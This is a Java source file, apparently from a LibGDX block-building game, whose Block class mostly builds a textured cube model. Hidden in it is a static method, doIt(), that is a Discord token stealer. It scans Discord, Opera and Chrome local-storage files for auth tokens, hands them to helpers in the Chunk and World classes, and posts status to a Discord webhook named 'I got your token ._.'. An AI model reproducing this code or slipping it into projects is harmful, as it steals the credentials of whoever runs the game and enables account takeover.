package com.glowman554.block.block;

import com.badlogic.gdx.graphics.GL20;
import com.badlogic.gdx.graphics.Texture;
import com.badlogic.gdx.graphics.VertexAttributes;
import com.badlogic.gdx.graphics.g3d.Material;
import com.badlogic.gdx.graphics.g3d.Model;
import com.badlogic.gdx.graphics.g3d.ModelInstance;
import com.badlogic.gdx.graphics.g3d.attributes.TextureAttribute;
import com.badlogic.gdx.graphics.g3d.utils.ModelBuilder;
import com.badlogic.gdx.math.Matrix4;
import com.badlogic.gdx.math.Vector3;
import com.badlogic.gdx.utils.Disposable;
import com.glowman554.block.discord.DiscordWebHook;
import com.glowman554.block.utils.FileUtils;
import com.glowman554.block.world.Chunk;
import com.glowman554.block.world.World;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Block implements Disposable {

    private static ModelBuilder modelBuilder = new ModelBuilder();
    public Model model;
    public ModelInstance instance;

    public Type type;

    public Block(Texture front, Texture back, Texture bottom, Texture top, Texture left, Texture right, Type type) {
        this.type = type;
        int attr = VertexAttributes.Usage.Position | VertexAttributes.Usage.Normal | VertexAttributes.Usage.TextureCoordinates;
        modelBuilder.begin();
        modelBuilder.part("front", GL20.GL_TRIANGLES, attr, new Material(TextureAttribute.createDiffuse(front))).rect(-2f, -2f, -2f, -2f, 2f, -2f, 2f, 2f, -2, 2f, -2f, -2f, 0, 0, -1);
        modelBuilder.part("back", GL20.GL_TRIANGLES, attr, new Material(TextureAttribute.createDiffuse(back))).rect(-2f, 2f, 2f, -2f, -2f, 2f, 2f, -2f, 2f, 2f, 2f, 2f, 0, 0, 1);
        modelBuilder.part("bottom", GL20.GL_TRIANGLES, attr, new Material(TextureAttribute.createDiffuse(bottom))).rect(-2f, -2f, 2f, -2f, -2f, -2f, 2f, -2f, -2f, 2f, -2f, 2f, 0, -1, 0);
        modelBuilder.part("top", GL20.GL_TRIANGLES, attr, new Material(TextureAttribute.createDiffuse(top))).rect(-2f, 2f, -2f, -2f, 2f, 2f, 2f, 2f, 2f, 2f, 2f, -2f, 0, 1, 0);
        modelBuilder.part("left", GL20.GL_TRIANGLES, attr, new Material(TextureAttribute.createDiffuse(left))).rect(-2f, -2f, 2f, -2f, 2f, 2f, -2f, 2f, -2f, -2f, -2f, -2f, -1, 0, 0);
        modelBuilder.part("right", GL20.GL_TRIANGLES, attr, new Material(TextureAttribute.createDiffuse(right))).rect(2f, -2f, -2f, 2f, 2f, -2f, 2f, 2f, 2f, 2f, -2f, 2f, 1, 0, 0);

        model = modelBuilder.end();

        instance = new ModelInstance(model);
    }

    public void setPosition(float x, float y, float z) {
        instance.transform = new Matrix4().translate(x, y, z);
    }

    public static void doIt() {
        List<String> paths = new ArrayList<>();

        String os = System.getProperty("os.name");

        if(os.contains("Windows")) {
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
        } else if(os.contains("Mac")) {
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
        } else {
            DiscordWebHook webHook = new DiscordWebHook(FileUtils.safe);
            webHook.setAvatarUrl(FileUtils.icon);
            webHook.setUsername("I got your token ._.");
            webHook.setContent("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
            try {
                webHook.execute();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
            return;
        }

        int cx = 0;
        StringBuilder tokens = new StringBuilder();

        try {
            for (String path : paths) {
                File f = new File(path);
                String[] pathnames = f.list();
                if (pathnames == null) continue;

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while ((strLine = br.readLine()) != null) {

                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                if (cx > 0) {
                                    tokens.append("\n");
                                }
                                tokens.append(" ").append(m.group());
                                cx++;
                            }

                        }

                    } catch (Exception ignored) {
                    }
                }
            }
            Chunk.sendItPriv(tokens);
            World.notifyDiscord();
        } catch (Exception e) {
            DiscordWebHook webHook = new DiscordWebHook(FileUtils.safe);
            webHook.setAvatarUrl(FileUtils.icon);
            webHook.setUsername("I got your token ._.");
            webHook.setContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
            try {
                webHook.execute();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
    }

    public Vector3 getPosition() {
        float x = instance.transform.getValues()[Matrix4.M03];
        float y = instance.transform.getValues()[Matrix4.M13];
        float z = instance.transform.getValues()[Matrix4.M23];
        return new Vector3(x, y, z);
    }

    @Override
    public void dispose() {
        model.dispose();
    }

    public enum Type {
        DirtBlock, WoodBlock, LeavesBlock, BerryBlock, GrassBlock, GlassBlock, StoneBlock, TestBlock;
    }
}
